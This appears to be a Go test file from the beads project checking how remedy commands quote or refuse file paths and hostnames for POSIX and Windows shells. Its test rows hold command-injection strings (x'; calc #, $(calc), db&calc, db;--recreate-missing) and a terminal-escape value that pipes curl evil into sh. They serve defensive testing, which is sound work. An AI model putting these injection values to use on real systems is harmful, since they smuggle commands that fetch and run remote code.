package main

import (
	"github.com/steveyegge/beads/internal/types"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"testing"
)

// TestShellQuotedFor pins how a remedy quotes a value (a source_repo, a
// dolt.host) for the shell its command is pasted into, and which values it
// refuses to print in a command at all (shellQuotedFor). On POSIX a value goes
// in single quotes unless it holds a backslash, which fish reads as an escape
// there, or a single quote: PowerShell ends them at a ' even as
// doltutil.ShellQuote escapes it, and at ‘ ’ ‚ ‛. On Windows a value goes in
// plain double quotes, which keep its backslashes as they are (Go's %q
// doubled them, and bd repo remove then found no such repository), unless a
// Windows shell would not pass it on unchanged: a " ends cmd.exe's quotes, so
// the rest of a crafted host runs as a command; PowerShell expands $( ) and
// $name, unescapes a backtick and ends the quotes at a curly quote; cmd.exe
// expands %name% and !name! and ends the command at a line break, and acts on
// & | < > ^ in an argument PowerShell hands a .cmd shim unquoted, and reads
// ; , = there as separating a batch file's arguments, so a shim that reads
// them one by one would hand bd init db.example.com;--recreate-missing as two;
// bash collapses \\ to one; and Go reads a trailing backslash as escaping the
// closing quote. Each POSIX and Windows character is refused by a row of its
// own. On both, a value that does not print as itself is refused: a control
// character ends the command, or redraws the printed one in the terminal so a
// different command is copied, U+202E reverses the text after it, U+2028
// splits the line, and a stray byte that is not UTF-8 can start a control
// sequence. A space such as U+00A0, U+202F or the U+3000 a Japanese IME types
// prints as itself, and is quoted like any other character. On a POSIX host
// each printed form is also run through a shell, which must pass the value on
// unchanged: sh for the POSIX forms, and bash, as Git Bash on Windows runs
// them, for the Windows forms.
func TestShellQuotedFor(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		goos, value, want string // want "" = refused
	}{
		{"linux", "/home/me/.beads-planning", `'/home/me/.beads-planning'`},
		{"darwin", "/tmp/$HOME/`id`", "'/tmp/$HOME/`id`'"},
		{"linux", "/home/zoë/計画 (2)", "'/home/zoë/計画 (2)'"},
		{"linux", "/home/太郎/プロジェクト\u3000計画", "'/home/太郎/プロジェクト\u3000計画'"},
		{"linux", "/home/me/my\u00a0planning", "'/home/me/my\u00a0planning'"},
		{"darwin", "/Users/me/Planning 9.41\u202fAM", "'/Users/me/Planning 9.41\u202fAM'"},
		{"linux", "db.example.com;--recreate-missing", "'db.example.com;--recreate-missing'"},
		{"linux", `x" & calc & "$(calc)`, `'x" & calc & "$(calc)'`},
		{"linux", "db\ncalc", ""},
		{"linux", "\x1b[2K\rbd init --server-host db; curl evil | sh #", ""},
		{"darwin", "db\u009bx", ""},
		{"linux", "db\x9b2Jx", ""},
		{"linux", "db\u202ex", ""},
		{"linux", "db\u2028x", ""},
		{"linux", `x\'; calc #`, ""},
		{"linux", `x\`, ""},
		{"linux", "x'; calc #", ""},
		{"darwin", "x\u2018; calc #", ""},
		{"darwin", "x\u2019; calc #", ""},
		{"darwin", "x\u201a; calc #", ""},
		{"darwin", "x\u201b; calc #", ""},
		{"windows", `C:\Users\me\.beads-planning`, `"C:\Users\me\.beads-planning"`},
		{"windows", `C:\Users\Jane Doe\Proj (x86) it's #1 @home ~a +b [e] {f}`, `"C:\Users\Jane Doe\Proj (x86) it's #1 @home ~a +b [e] {f}"`},
		{"windows", `C:\Users\太郎\プロジェクト` + "\u3000" + `計画`, `"C:\Users\太郎\プロジェクト` + "\u3000" + `計画"`},
		{"windows", `C:\Users\me\my` + "\u00a0" + `planning`, `"C:\Users\me\my` + "\u00a0" + `planning"`},
		{"windows", "db.example.com; calc", ""},
		{"windows", "db.example.com;--recreate-missing", ""},
		{"windows", "db.example.com,--recreate-missing", ""},
		{"windows", "db.example.com=--recreate-missing", ""},
		{"windows", `x" & calc & "`, ""},
		{"windows", `x";calc;#`, ""},
		{"windows", "db\u201ex", ""},
		{"windows", "db\u201cx", ""},
		{"windows", "db\u201dx", ""},
		{"windows", "db|calc", ""},
		{"windows", "db<x", ""},
		{"windows", "db>x", ""},
		{"windows", "db^x", ""},
		{"windows", "\x1b[2K\rbd init", ""},
		{"windows", "db\u202ex", ""},
		{"windows", "db\u2028x", ""},
		{"windows", "$(calc)", ""},
		{"windows", `C:\Users\me\$work\planning`, ""},
		{"windows", "C:\\Users\\me\\`tplanning", ""},
		{"windows", "db\u201d; calc; \u201c", ""},
		{"windows", `C:\100%PATH%\planning`, ""},
		{"windows", `C:\Hello!\planning`, ""},
		{"windows", "db&calc", ""},
		{"windows", `C:\Users\Jane Doe\R&D planning`, ""},
		{"windows", "db\r\ncalc", ""},
		{"windows", `\\server\share\planning`, ""},
		{"windows", `C:\planning\`, ""},
	} {
		got, ok := shellQuotedFor(tc.goos, tc.value)
		if got != tc.want || ok != (tc.want != "") {
			t.Errorf("shellQuotedFor(%q, %q) = %s, %v, want %s, %v", tc.goos, tc.value, got, ok, tc.want, tc.want != "")
		}
		if !ok || runtime.GOOS == "windows" {
			continue
		}
		shell := "sh"
		if tc.goos == "windows" {
			shell = "bash"
		}
		out, err := exec.Command(shell, "-c", "printf '%s' "+got).Output()
		if err != nil {
			t.Fatalf("%s -c \"printf '%%s' %s\": %v", shell, got, err)
		}
		if string(out) != tc.value {
			t.Errorf("%s passed %s on as %q, want %q", shell, got, out, tc.value)
		}
	}
}

// TestEscapedValue pins how a refusal names a value its remedy leaves as a
// placeholder (escapedValue): Go-quoted, so strconv.Unquote reads the name back
// as the value, with every quote and every $ ` % ! & | < > ^ ; , = escaped too,
// so no shell expands what is between its double quotes, ends them early or
// splits the argument there, and a user who pastes the name as printed runs
// nothing. strconv.Quote alone left x" & calc & "$(calc) as
// "x\" & calc & \"$(calc)", which bash runs $(calc) in, and PowerShell, which
// takes \ literally, ends at the second " and runs calc. On a POSIX host each
// name is also run through sh, which must print what is between its quotes,
// reading only each \\ there as one backslash.
func TestEscapedValue(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct{ value, want string }{
		{"db.example.com", `"db.example.com"`},
		{`x" & calc & "$(calc)`, `"x\x22 \x26 calc \x26 \x22\x24(calc)"`},
		{"x'; calc #", `"x\x27\x3b calc #"`},
		{`C:\Users\me\$work\planning\`, `"C:\\Users\\me\\\x24work\\planning\\"`},
		{"db.example.com;--recreate-missing,=", `"db.example.com\x3b--recreate-missing\x2c\x3d"`},
		{"`calc` %PATH% !x! a|b<c>d^e", `"\x60calc\x60 \x25PATH\x25 \x21x\x21 a\x7cb\x3cc\x3ed\x5ee"`},
		{"\u201ccalc\u201d \u201e \u2018x\u2019 \u201a \u201b", `"\u201ccalc\u201d \u201e \u2018x\u2019 \u201a \u201b"`},
		{"\x1b[2K\rbd\u202e\u3000計画\xff", `"\x1b[2K\rbd\u202e\u3000計画\xff"`},
	} {
		got := escapedValue(tc.value)
		if got != tc.want {
			t.Errorf("escapedValue(%q) = %s, want %s", tc.value, got, tc.want)
		}
		if unquoted, err := strconv.Unquote(got); err != nil || unquoted != tc.value {
			t.Errorf("strconv.Unquote(%s) = %q, %v, want %q", got, unquoted, err, tc.value)
		}
		inner := strings.TrimSuffix(strings.TrimPrefix(got, `"`), `"`)
		if strings.ContainsAny(inner, "\"“”„'‘’‚‛$`%!&|<>^;,=") {
			t.Errorf("escapedValue(%q) = %s holds a character a shell acts on between its quotes", tc.value, got)
		}
		if runtime.GOOS == "windows" {
			continue
		}
		out, err := exec.Command("sh", "-c", "printf '%s' "+got).Output()
		if err != nil {
			t.Fatalf("sh -c \"printf '%%s' %s\": %v", got, err)
		}
		if want := strings.ReplaceAll(inner, `\\`, `\`); string(out) != want {
			t.Errorf("sh printed %s as %q, want %q", got, out, want)
		}
	}
}

// TestRepoSyncMirrorRefusal pins the phase-0 refusal's bd repo remove and bd
// repo add commands on both platforms: the source_repo quoted for the shell
// (TestShellQuotedFor), or, when no quoting passes it on unchanged there, a
// <path> placeholder for the path the refusal names escaped (TestEscapedValue),
// so pasting that name in its place runs nothing either. A value it names that
// does not print as itself, such as one holding a carriage return, a terminal
// escape or U+202E, is named escaped (printedValue), so none of those reaches
// the line the commands are printed on.
func TestRepoSyncMirrorRefusal(t *testing.T) {
	t.Parallel()
	const prefix = "issue mps-1 already exists in the planning repo P; the project copy was imported from "
	const placeholders = "`bd repo sync` (remove those copies with `bd repo remove <path>`, then rerun, and run `bd repo add <path>` again if you want them hydrated, with that path for <path>); nothing was moved"
	for _, tc := range []struct {
		goos, sourceRepo, want string
	}{
		{"linux", "/home/me/planning", prefix + "/home/me/planning by `bd repo sync` (remove those copies with `bd repo remove '/home/me/planning'`, then rerun, and run `bd repo add '/home/me/planning'` again if you want them hydrated); nothing was moved"},
		{"windows", `C:\planning`, prefix + `C:\planning by ` + "`bd repo sync` (remove those copies with `bd repo remove \"C:\\planning\"`, then rerun, and run `bd repo add \"C:\\planning\"` again if you want them hydrated); nothing was moved"},
		{"windows", `C:\planning\`, prefix + `"C:\\planning\\" by ` + placeholders},
		{"windows", `C:\Users\me\$work\planning`, prefix + `"C:\\Users\\me\\\x24work\\planning" by ` + placeholders},
		{"windows", `C:\x" & calc & "$(calc)`, prefix + `"C:\\x\x22 \x26 calc \x26 \x22\x24(calc)" by ` + placeholders},
		{"linux", "/home/me/x'; calc #", prefix + `"/home/me/x\x27\x3b calc #" by ` + placeholders},
		{"linux", "/home/me/planning/\x1b[2K\r/..", prefix + `"/home/me/planning/\x1b[2K\r/.." by ` + placeholders},
		{"windows", "C:\\planning\u202e\\..", prefix + `"C:\\planning\u202e\\.." by ` + placeholders},
	} {
		err := repoSyncMirrorRefusal(&types.Issue{ID: "mps-1", SourceRepo: tc.sourceRepo}, "P", tc.goos)
		if err == nil || err.Error() != tc.want || strings.ContainsAny(err.Error(), "\x1b\r\u202e") {
			t.Errorf("repoSyncMirrorRefusal(source_repo %q, %q) = %q\nwant %q", tc.sourceRepo, tc.goos, err, tc.want)
		}
	}
	// The issue ID and planning repo it names beside the commands are spelled
	// the same way.
	id, planningPath := "mps-1\x1b[2K", "/home/me/planning\r"
	err := repoSyncMirrorRefusal(&types.Issue{ID: id, SourceRepo: planningPath}, planningPath, "linux")
	want := `issue "mps-1\x1b[2K" already exists in the planning repo "/home/me/planning\r"; the project copy was imported from "/home/me/planning\r" by ` + placeholders
	if err == nil || err.Error() != want || strings.ContainsAny(err.Error(), "\x1b\r") {
		t.Errorf("repoSyncMirrorRefusal(ID %q, planning repo %q) = %q\nwant %q", id, planningPath, err, want)
	}
}
